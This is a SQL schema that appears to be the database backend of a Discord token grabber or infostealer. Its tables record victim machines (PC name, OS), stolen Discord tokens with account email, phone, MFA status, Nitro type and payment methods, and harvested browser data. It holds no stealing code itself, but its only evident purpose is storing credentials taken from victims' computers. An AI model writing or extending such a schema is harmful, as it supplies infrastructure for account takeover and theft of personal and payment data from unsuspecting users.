CREATE TABLE IF NOT EXISTS systems (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    pc_name TEXT NOT NULL,
    os_info TEXT NOT NULL,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS tokens (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    system_id INTEGER NOT NULL,
    token TEXT NOT NULL,
    username TEXT NOT NULL,
    discriminator TEXT DEFAULT '0000',
    user_id TEXT NOT NULL,
    email TEXT DEFAULT NULL,
    phone TEXT DEFAULT NULL,
    mfa_enabled BOOLEAN DEFAULT FALSE,
    nitro_type TEXT DEFAULT 'None',
    payment_methods TEXT DEFAULT '[]',
    avatar TEXT DEFAULT NULL,
    FOREIGN KEY (system_id) REFERENCES systems(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS browser_data (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    system_id INTEGER NOT NULL,
    browser_name TEXT NOT NULL,
    data_type TEXT NOT NULL,
    content TEXT NOT NULL,
    FOREIGN KEY (system_id) REFERENCES systems(id) ON DELETE CASCADE
);